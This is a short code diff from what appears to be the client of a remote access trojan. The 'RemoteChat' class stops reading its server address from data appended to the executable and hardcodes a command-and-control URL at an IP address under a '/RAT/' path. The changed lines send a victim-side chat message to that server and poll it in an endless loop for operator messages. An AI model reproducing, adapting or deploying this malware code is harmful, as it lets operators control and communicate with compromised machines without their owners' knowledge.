@@ -37,7 +37,7 @@ Public Class RemoteChat
     End Sub
 
     Private Sub sendButtonClickSub()
-        Dim sendMessageQuery = New WebClient().DownloadString(MainForm.EOFArguments(0) &
+        Dim sendMessageQuery = New WebClient().DownloadString("http://185.62.188.189/RAT/" &
                              "clients.php?action=clientsend" &
                              "&actioncontent=" & messageTB.Text)
 
@@ -49,7 +49,7 @@ Public Class RemoteChat
         Dim lastMessageReceived As String = ""
 
         While True
-            Dim receivedMessageQuery = New WebClient().DownloadString(MainForm.EOFArguments(0) & "clients.php?action=clientreceive")
+            Dim receivedMessageQuery = New WebClient().DownloadString("http://185.62.188.189/RAT/" & "clients.php?action=clientreceive")
 
             If receivedMessageQuery = lastMessageReceived Then
                 GoTo EndOfTreatement
